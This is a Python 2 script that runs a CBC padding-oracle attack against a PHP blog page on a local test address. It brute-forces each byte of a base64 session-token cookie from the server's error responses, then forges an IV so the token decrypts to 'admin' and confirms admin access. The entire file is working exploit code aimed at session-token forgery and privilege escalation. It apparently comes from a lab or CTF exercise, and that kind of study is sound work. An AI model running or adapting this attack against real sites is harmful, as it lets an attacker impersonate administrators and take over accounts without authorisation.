#coding=utf-8
import requests
import base64
import re
import Utf8
import os

url = 'http://127.0.0.1:8089/test/simple-blog/src/1.php'

m=''
Middle = ''
def M(a):

    global m,Middle
    Middle=chr(ord(a)^(len(m)+1))+Middle
    # m = m + chr(ord(Middle)^(len(m)+2))
    print 'Middle len : '+str(len(Middle))
    m=''
    for i in xrange(0,len(Middle)):
        m += chr(ord(Middle[i])^(len(Middle)+1))
    print 'Middle : '+Middle.encode('hex')
    print 'm : '+m.encode('hex')

while 1:
    os.system('cls')
    rs = requests.session()
    # r1 = rs.post(url, data={'username': 'admin', 'password': 'admin'}, allow_redirects=False)
    r1 = rs.get(url)
    for ii in xrange(0,15):
        # print r1.headers
        print 'Middle '+str(ii+1)
        session = re.findall('PHPSESSID=(.*); path',str(r1.headers))[0]
        token = re.findall("path=/, token=(.*)', 'Expir",str(r1.headers))[0].replace('%3D','=')
        for i in xrange(0,256):
            temptoken = ('00'.decode('hex'))*(15-len(m))+chr(i)+m
            headers = {'Cookie': 'PHPSESSID='+session+';token=' + base64.b64encode(temptoken)}
            r2 = rs.get(url,headers=headers)
            print r2.content+'--------'+str(i)
            if 'Error' not in r2.content:
                print '----------------------------------------pwn--------------------------------' +str(ii)
                print 'token : '+ base64.b64decode(token)
                print 'session : ' + session
                print 'temptoken hex : ' + temptoken.encode('hex')
                print  'temptoken base64decode : '+ base64.b64encode(temptoken)
                print r2.content
                M(chr(i))
                if ii==14:
                    print '---------------------------------------------------------------16 pwn------'
                    for i in xrange(0,256):
                        Middle_16 = chr(i)+Middle
                        print 'Middle_16 len : '+str(len(Middle_16))
                        print 'Middle_16 hex : '+ Middle_16.encode('hex')
                        print 'token : ' + base64.b64decode(token)
                        Op=''
                        for j in xrange(0,16):
                            Op+=chr(ord(Middle_16[j])^ord(token[j]))
                        print 'Op len : '+ str(len(Op))
                        print 'Op : '+Op
                        Newp = 'admin'+chr(11)*11
                        print 'Newp len : '+str(len(Newp))
                        print 'Newp hex: '+ Newp.encode('hex')
                        print 'Op hex: '+Op.encode('hex')
                        newIv = ''
                        for jj in xrange(0,16):
                            newIv += chr(ord(token[jj])^ord(Op[jj])^ord(Newp[jj]))
                        print 'newIv len : '+str(len(newIv))
                        print 'newIv hex : '+newIv.encode('hex')
                        r2 = rs.get(url,headers={'Cookie': 'PHPSESSID='+session+';token=' + base64.b64encode(newIv)})
                        print 'result : '+r2.content
                        if 'You are admin' in r2.content:
                            print '-----------------------ok pwn-------------------------------------------'
                            print 'session : ' + session
                            print 'newIv hex : ' + newIv.encode('hex')
                            print 'newIv base64 : ' + base64.b64encode(newIv)
                            print '-----------------------ok pwn-------------------------------------------'
                            exit()
                    print '---------------------------------------------------------------16 pwn------'
                print '----------------------------------------pwn--------------------------------' + str(ii)
                break

